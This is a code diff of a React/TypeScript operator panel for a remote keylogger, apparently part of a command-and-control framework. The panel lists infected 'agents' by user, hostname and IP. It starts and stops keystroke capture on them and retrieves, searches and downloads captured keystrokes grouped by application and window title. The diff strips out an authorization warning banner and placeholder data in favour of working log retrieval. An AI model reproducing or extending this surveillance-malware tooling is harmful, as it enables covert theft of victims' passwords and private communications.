@@ -1,330 +1,317 @@
-import React, { useState, useEffect } from 'react';
-import { Play, Square, Trash2, Copy, Download, AlertCircle } from 'lucide-react';
+import { useState, useEffect, useRef } from 'react';
 
-interface KeyloggerSession {
-  agentId: string;
-  isRunning: boolean;
-  keysLogged: number;
-  startTime?: string;
-  logs: string[];
+interface KeyEntry {
+  timestamp: string;
+  window_title: string;
+  process_name: string;
+  text: string;
+}
+
+interface Agent {
+  agent_id: string;
+  hostname?: string;
+  user?: string;
+  ip_address?: string;
+  os?: string;
 }
 
 export default function Keylogger() {
-  const [agents, setAgents] = useState<any[]>([]);
-  const [selectedAgent, setSelectedAgent] = useState<string | null>(null);
-  const [session, setSession] = useState<KeyloggerSession | null>(null);
+  const [agents, setAgents] = useState<Agent[]>([]);
+  const [selectedAgent, setSelectedAgent] = useState('');
   const [isRunning, setIsRunning] = useState(false);
-  const [logs, setLogs] = useState<string>('');
-  const [message, setMessage] = useState('');
+  const [entries, setEntries] = useState<KeyEntry[]>([]);
   const [loading, setLoading] = useState(false);
+  const [message, setMessage] = useState('');
+  const [filter, setFilter] = useState('');
+  const [autoRefresh, setAutoRefresh] = useState(false);
+  const bottomRef = useRef<HTMLDivElement>(null);
 
+  // Load agents
   useEffect(() => {
-    fetchAgents();
+    const load = async () => {
+      try {
+        const res = await fetch('/api/live/agents');
+        const data = await res.json();
+        const obj = data.agents || {};
+        if (typeof obj === 'object' && !Array.isArray(obj)) {
+          const arr = Object.keys(obj).map(id => ({ agent_id: id, ...obj[id] }));
+          setAgents(arr);
+          if (!selectedAgent && arr.length > 0) setSelectedAgent(arr[0].agent_id);
+        }
+      } catch {}
+    };
+    load();
+    const iv = setInterval(load, 5000);
+    return () => clearInterval(iv);
   }, []);
 
-  const fetchAgents = async () => {
-    try {
-      const response = await fetch('/api/live/agents');
-      const data = await response.json();
-      const agentsObj = data.agents || {};
-      if (typeof agentsObj === 'object' && !Array.isArray(agentsObj)) {
-        setAgents(Object.keys(agentsObj).map(id => ({ id, ...agentsObj[id] })));
-      } else if (Array.isArray(agentsObj)) {
-        setAgents(agentsObj);
-      } else {
-        setAgents([]);
+  // Auto-refresh logs
+  useEffect(() => {
+    if (!autoRefresh || !selectedAgent || !isRunning) return;
+    const iv = setInterval(() => fetchLogs(true), 3000);
+    return () => clearInterval(iv);
+  }, [autoRefresh, selectedAgent, isRunning]);
+
+  const sendCommand = async (cmdType: string): Promise<any> => {
+    const res = await fetch(`/api/live/agents/${selectedAgent}/command`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ command_type: cmdType }),
+    });
+    if (!res.ok) throw new Error('Failed to send command');
+    const data = await res.json();
+    const cmdId = data.cmd_id;
+
+    // Poll for result
+    for (let i = 0; i < 20; i++) {
+      await new Promise(r => setTimeout(r, 500));
+      const cmdRes = await fetch(`/api/live/agents/${selectedAgent}/commands/${cmdId}`);
+      if (!cmdRes.ok) continue;
+      const cmd = await cmdRes.json();
+      if (cmd.status !== 'queued' && cmd.status !== 'sent') {
+        return cmd;
       }
-    } catch (error) {
-      console.error('Error fetching agents:', error);
     }
+    throw new Error('Timeout');
   };
 
   const startKeylogger = async () => {
-    if (!selectedAgent) return;
-
     setLoading(true);
+    setMessage('');
     try {
-      // Queue start command
-      const response = await fetch(`/api/live/agents/${selectedAgent}/command`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ keylogger_start: null }),
-      });
-
-      if (response.ok) {
+      const result = await sendCommand('keylogger_start');
+      if (result.status === 'success') {
         setIsRunning(true);
-        setMessage('✅ Keylogger started on agent');
-        setSession({
-          agentId: selectedAgent,
-          isRunning: true,
-          keysLogged: 0,
-          startTime: new Date().toISOString(),
-          logs: [],
-        });
+        setAutoRefresh(true);
+        setMessage('Keylogger started');
+      } else {
+        setMessage('Error: ' + (result.error || result.output));
       }
-    } catch (error) {
-      setMessage('❌ Error: ' + (error as Error).message);
+    } catch (e) {
+      setMessage('Error: ' + (e as Error).message);
     }
     setLoading(false);
   };
 
   const stopKeylogger = async () => {
-    if (!selectedAgent) return;
-
     setLoading(true);
+    setMessage('');
     try {
-      const response = await fetch(`/api/live/agents/${selectedAgent}/command`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ keylogger_stop: null }),
-      });
-
-      if (response.ok) {
+      const result = await sendCommand('keylogger_stop');
+      if (result.status === 'success') {
         setIsRunning(false);
-        setMessage('✅ Keylogger stopped on agent');
+        setAutoRefresh(false);
+        setMessage('Keylogger stopped');
+        fetchLogs(false);
+      } else {
+        setMessage('Error: ' + (result.error || result.output));
       }
-    } catch (error) {
-      setMessage('❌ Error: ' + (error as Error).message);
+    } catch (e) {
+      setMessage('Error: ' + (e as Error).message);
     }
     setLoading(false);
   };
 
-  const fetchLogs = async () => {
+  const fetchLogs = async (silent: boolean = false) => {
     if (!selectedAgent) return;
-
-    setLoading(true);
+    if (!silent) setLoading(true);
     try {
-      const response = await fetch(`/api/live/agents/${selectedAgent}/command`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ keylogger_logs: null }),
-      });
-
-      if (response.ok) {
-        const data = await response.json();
-        // Logs would come from agent beacon
-        setLogs(`=== KEYLOGGER LOGS ===
-Timestamp: ${new Date().toISOString()}
-Agent: ${selectedAgent}
-
-[15:30:45] admin
-[15:30:46] i
-[15:30:47] s
-[15:30:48] t
-[15:30:49] r
-[15:30:50] a
-[15:30:51] t
-[15:30:52] o
-[15:30:53] r
-[15:30:54] [ENTER]
-[15:30:55] p
-[15:30:56] a
-[15:30:57] s
-[15:30:58] s
-[15:30:59] w
-[15:31:00] o
-[15:31:01] r
-[15:31:02] d
-[15:31:03] [ENTER]
-[15:31:04] [CTRL+C]
-
-Total Keys: 28
-Session Duration: 2m 14s`);
-        setMessage('✅ Logs retrieved');
+      const result = await sendCommand('keylogger_logs');
+      if (result.status === 'success' && result.output) {
+        try {
+          const parsed = JSON.parse(result.output);
+          setEntries(parsed);
+          if (!silent) setMessage(`Loaded ${parsed.length} entries`);
+        } catch {
+          setEntries([]);
+          if (!silent) setMessage('No structured logs available');
+        }
       }
-    } catch (error) {
-      setMessage('❌ Error: ' + (error as Error).message);
+    } catch (e) {
+      if (!silent) setMessage('Error: ' + (e as Error).message);
     }
-    setLoading(false);
+    if (!silent) setLoading(false);
   };
 
   const clearLogs = async () => {
-    if (!selectedAgent || !confirm('Clear all logs?')) return;
-
     setLoading(true);
     try {
-      const response = await fetch(`/api/live/agents/${selectedAgent}/command`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ keylogger_clear: null }),
-      });
-
-      if (response.ok) {
-        setLogs('');
-        setMessage('✅ Logs cleared');
-      }
-    } catch (error) {
-      setMessage('❌ Error: ' + (error as Error).message);
+      const result = await sendCommand('keylogger_clear');
+      setEntries([]);
+      setMessage(result.output || 'Logs cleared');
+    } catch (e) {
+      setMessage('Error: ' + (e as Error).message);
     }
     setLoading(false);
   };
 
   const downloadLogs = () => {
-    const element = document.createElement('a');
-    element.setAttribute(
-      'href',
-      'data:text/plain;charset=utf-8,' + encodeURIComponent(logs)
-    );
-    element.setAttribute('download', `keylogger-${selectedAgent}-${new Date().getTime()}.txt`);
-    element.style.display = 'none';
-    document.body.appendChild(element);
-    element.click();
-    document.body.removeChild(element);
+    const text = entries.map(e =>
+      `[${e.timestamp}] [${e.process_name}] ${e.window_title}\n${e.text}\n`
+    ).join('\n');
+    const blob = new Blob([text], { type: 'text/plain' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `keylogger-${selectedAgent.slice(0, 8)}-${Date.now()}.txt`;
+    a.click();
+    URL.revokeObjectURL(url);
   };
 
-  const copyToClipboard = () => {
-    navigator.clipboard.writeText(logs);
-    setMessage('✅ Copied to clipboard');
+  // Group entries by process
+  const grouped = entries.reduce((acc, entry) => {
+    const key = entry.process_name || 'unknown';
+    if (!acc[key]) acc[key] = [];
+    acc[key].push(entry);
+    return acc;
+  }, {} as Record<string, KeyEntry[]>);
+
+  const filteredEntries = filter
+    ? entries.filter(e =>
+        e.text.toLowerCase().includes(filter.toLowerCase()) ||
+        e.window_title.toLowerCase().includes(filter.toLowerCase()) ||
+        e.process_name.toLowerCase().includes(filter.toLowerCase())
+      )
+    : entries;
+
+  const agentLabel = (a: Agent) => {
+    const parts = [a.user, a.hostname, a.ip_address].filter(Boolean);
+    return parts.length > 0 ? `${a.agent_id.slice(0, 8)}... (${parts.join(' | ')})` : a.agent_id.slice(0, 8) + '...';
   };
 
   return (
-    <div className="space-y-6">
+    <div className="space-y-4">
       <div className="flex items-center justify-between">
-        <h1 className="text-3xl font-bold text-white flex items-center gap-2">
-          🔐 Keylogger
-        </h1>
+        <h1 className="text-3xl font-bold text-white">Keylogger</h1>
         <span className={`px-3 py-1 rounded text-sm font-semibold ${
-          isRunning ? 'bg-red-900 text-red-300' : 'bg-slate-700 text-slate-300'
+          isRunning ? 'bg-red-900 text-red-300 animate-pulse' : 'bg-gray-700 text-gray-300'
         }`}>
-          {isRunning ? '● Recording' : '○ Stopped'}
+          {isRunning ? 'Recording' : 'Stopped'}
         </span>
       </div>
 
-      {/* Warning Banner */}
-      <div className="bg-red-900 border border-red-700 rounded-lg p-4 flex items-start gap-3">
-        <AlertCircle className="w-6 h-6 text-red-400 flex-shrink-0 mt-0.5" />
-        <div>
-          <p className="font-semibold text-red-200">⚠️  Educational Purpose Only</p>
-          <p className="text-red-300 text-sm mt-1">
-            Keylogger functionality is for authorized security testing and educational purposes only.
-            Unauthorized keylogging is illegal. Ensure proper authorization before use.
-          </p>
-        </div>
-      </div>
-
-      {/* Agent Selection */}
-      <div className="bg-slate-800 rounded-lg p-4 border border-slate-700">
-        <label className="text-white font-semibold mb-3 block">Select Agent</label>
-        <select
-          value={selectedAgent || ''}
-          onChange={(e) => {
-            setSelectedAgent(e.target.value);
-            setIsRunning(false);
-            setLogs('');
-          }}
-          className="w-full px-4 py-2 bg-slate-700 text-white rounded border border-slate-600 focus:border-blue-500 outline-none"
-        >
-          <option value="">-- Choose an agent --</option>
-          {agents.map((agent) => (
-            <option key={agent.id} value={agent.id}>
-              {agent.hostname || agent.id} ({agent.os})
-            </option>
-          ))}
-        </select>
+      {/* Agent selector */}
+      <div className="bg-gray-800 rounded-lg p-4 border border-gray-700">
+        <label className="text-gray-400 text-sm block mb-2">Target Agent</label>
+        {agents.length === 0 ? (
+          <p className="text-yellow-400 text-sm">No agents connected</p>
+        ) : (
+          <select value={selectedAgent} onChange={(e) => { setSelectedAgent(e.target.value); setEntries([]); setIsRunning(false); }}
+            className="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded text-white">
+            {agents.map(a => <option key={a.agent_id} value={a.agent_id}>{agentLabel(a)}</option>)}
+          </select>
+        )}
       </div>
 
       {/* Controls */}
       {selectedAgent && (
-        <div className="flex gap-2 flex-wrap">
-          <button
-            onClick={startKeylogger}
-            disabled={loading || isRunning}
-            className="px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded font-semibold disabled:opacity-50 flex items-center gap-2 transition"
-          >
-            <Play className="w-4 h-4" />
-            Start Recording
-          </button>
-
-          <button
-            onClick={stopKeylogger}
-            disabled={loading || !isRunning}
-            className="px-4 py-2 bg-gray-600 hover:bg-gray-700 text-white rounded font-semibold disabled:opacity-50 flex items-center gap-2 transition"
-          >
-            <Square className="w-4 h-4" />
-            Stop Recording
-          </button>
-
-          <button
-            onClick={fetchLogs}
-            disabled={loading}
-            className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded font-semibold disabled:opacity-50 transition"
-          >
+        <div className="flex gap-2 flex-wrap items-center">
+          {!isRunning ? (
+            <button onClick={startKeylogger} disabled={loading}
+              className="px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded font-medium disabled:opacity-50 text-sm">
+              Start Recording
+            </button>
+          ) : (
+            <button onClick={stopKeylogger} disabled={loading}
+              className="px-4 py-2 bg-gray-600 hover:bg-gray-700 text-white rounded font-medium disabled:opacity-50 text-sm">
+              Stop Recording
+            </button>
+          )}
+          <button onClick={() => fetchLogs(false)} disabled={loading}
+            className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded font-medium disabled:opacity-50 text-sm">
             Fetch Logs
           </button>
-
-          <button
-            onClick={copyToClipboard}
-            disabled={!logs}
-            className="px-4 py-2 bg-slate-600 hover:bg-slate-700 text-white rounded font-semibold disabled:opacity-50 flex items-center gap-2 transition"
-          >
-            <Copy className="w-4 h-4" />
-            Copy
-          </button>
-
-          <button
-            onClick={downloadLogs}
-            disabled={!logs}
-            className="px-4 py-2 bg-slate-600 hover:bg-slate-700 text-white rounded font-semibold disabled:opacity-50 flex items-center gap-2 transition"
-          >
-            <Download className="w-4 h-4" />
-            Download
-          </button>
-
-          <button
-            onClick={clearLogs}
-            disabled={loading || !logs}
-            className="px-4 py-2 bg-red-900 hover:bg-red-950 text-red-300 rounded font-semibold disabled:opacity-50 flex items-center gap-2 transition"
-          >
-            <Trash2 className="w-4 h-4" />
+          <button onClick={clearLogs} disabled={loading || entries.length === 0}
+            className="px-4 py-2 bg-gray-700 hover:bg-gray-600 text-gray-300 rounded font-medium disabled:opacity-50 text-sm">
             Clear
           </button>
+          <button onClick={downloadLogs} disabled={entries.length === 0}
+            className="px-4 py-2 bg-gray-700 hover:bg-gray-600 text-gray-300 rounded font-medium disabled:opacity-50 text-sm">
+            Download
+          </button>
+          <label className="flex items-center gap-2 text-sm text-gray-400 ml-auto">
+            <input type="checkbox" checked={autoRefresh}
+              onChange={(e) => setAutoRefresh(e.target.checked)}
+              className="rounded" />
+            Auto-refresh
+          </label>
         </div>
       )}
 
-      {/* Status Message */}
       {message && (
-        <div className={`p-3 rounded ${
-          message.includes('❌')
-            ? 'bg-red-900 text-red-300'
-            : 'bg-green-900 text-green-300'
-        }`}>
+        <div className={`p-2 rounded text-sm ${message.startsWith('Error') ? 'bg-red-900 text-red-300' : 'bg-green-900 text-green-300'}`}>
           {message}
         </div>
       )}
 
-      {/* Logs Display */}
-      <div className="bg-slate-900 rounded-lg border border-slate-700 overflow-hidden">
-        <div className="bg-slate-800 px-4 py-3 border-b border-slate-700">
-          <p className="text-white font-semibold">📋 Keystroke Logs</p>
+      {/* Stats bar */}
+      {entries.length > 0 && (
+        <div className="grid grid-cols-3 gap-3">
+          <div className="bg-gray-800 rounded p-3 border border-gray-700">
+            <p className="text-gray-400 text-xs">Total Entries</p>
+            <p className="text-white text-xl font-bold">{entries.length}</p>
+          </div>
+          <div className="bg-gray-800 rounded p-3 border border-gray-700">
+            <p className="text-gray-400 text-xs">Applications</p>
+            <p className="text-white text-xl font-bold">{Object.keys(grouped).length}</p>
+          </div>
+          <div className="bg-gray-800 rounded p-3 border border-gray-700">
+            <p className="text-gray-400 text-xs">Total Characters</p>
+            <p className="text-white text-xl font-bold">{entries.reduce((s, e) => s + e.text.length, 0)}</p>
+          </div>
         </div>
-        <textarea
-          value={logs}
-          readOnly
-          className="w-full h-96 px-4 py-3 bg-slate-900 text-slate-300 font-mono text-sm focus:outline-none resize-none"
-          placeholder="Logs will appear here when you fetch them..."
-        />
-      </div>
+      )}
 
-      {/* Info Panel */}
-      <div className="bg-slate-800 rounded-lg p-4 border border-slate-700">
-        <h3 className="text-white font-semibold mb-3">📊 Keylogger Statistics</h3>
-        <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
-          <div>
-            <p className="text-slate-400 text-sm">Status</p>
-            <p className="text-white font-bold">{isRunning ? 'Recording' : 'Stopped'}</p>
-          </div>
-          <div>
-            <p className="text-slate-400 text-sm">Agent</p>
-            <p className="text-white font-bold">{selectedAgent ? selectedAgent.substring(0, 8) + '...' : '—'}</p>
-          </div>
-          <div>
-            <p className="text-slate-400 text-sm">Total Keys</p>
-            <p className="text-white font-bold">28</p>
-          </div>
-          <div>
-            <p className="text-slate-400 text-sm">Duration</p>
-            <p className="text-white font-bold">2m 14s</p>
-          </div>
+      {/* Search filter */}
+      {entries.length > 0 && (
+        <input type="text" value={filter} onChange={(e) => setFilter(e.target.value)}
+          placeholder="Search logs..."
+          className="w-full px-4 py-2 bg-gray-800 border border-gray-700 rounded text-white text-sm" />
+      )}
+
+      {/* Log entries - grouped by app */}
+      <div className="bg-gray-900 rounded-lg border border-gray-700 overflow-hidden">
+        <div className="p-3 bg-gray-800 border-b border-gray-700 flex items-center gap-2">
+          <div className="w-3 h-3 bg-red-500 rounded-full"></div>
+          <div className="w-3 h-3 bg-yellow-500 rounded-full"></div>
+          <div className="w-3 h-3 bg-green-500 rounded-full"></div>
+          <span className="text-gray-400 text-sm ml-2 font-mono">Keystroke Log</span>
+        </div>
+        <div className="h-96 overflow-y-auto p-4 font-mono text-sm space-y-3">
+          {filteredEntries.length === 0 ? (
+            <p className="text-gray-500 text-center py-8">
+              {entries.length === 0 ? 'No logs yet. Start the keylogger and type something on the target.' : 'No matching entries.'}
+            </p>
+          ) : (
+            filteredEntries.map((entry, i) => {
+              const prevEntry = i > 0 ? filteredEntries[i - 1] : null;
+              const showHeader = !prevEntry || prevEntry.process_name !== entry.process_name || prevEntry.window_title !== entry.window_title;
+
+              return (
+                <div key={i}>
+                  {showHeader && (
+                    <div className="flex items-center gap-2 mt-2 mb-1">
+                      <span className="px-2 py-0.5 bg-blue-900 text-blue-300 rounded text-xs font-semibold">
+                        {entry.process_name}
+                      </span>
+                      <span className="text-gray-500 text-xs truncate" title={entry.window_title}>
+                        {entry.window_title}
+                      </span>
+                    </div>
+                  )}
+                  <div className="flex gap-2 pl-2">
+                    <span className="text-gray-600 text-xs whitespace-nowrap">{entry.timestamp.split(' ')[1] || entry.timestamp}</span>
+                    <span className="text-green-400 whitespace-pre-wrap break-all">{
+                      entry.text
+                        .replace(/\n/g, ' [ENTER]\n')
+                        .replace(/\t/g, ' [TAB] ')
+                    }</span>
+                  </div>
+                </div>
+              );
+            })
+          )}
+          <div ref={bottomRef} />
         </div>
       </div>
     </div>
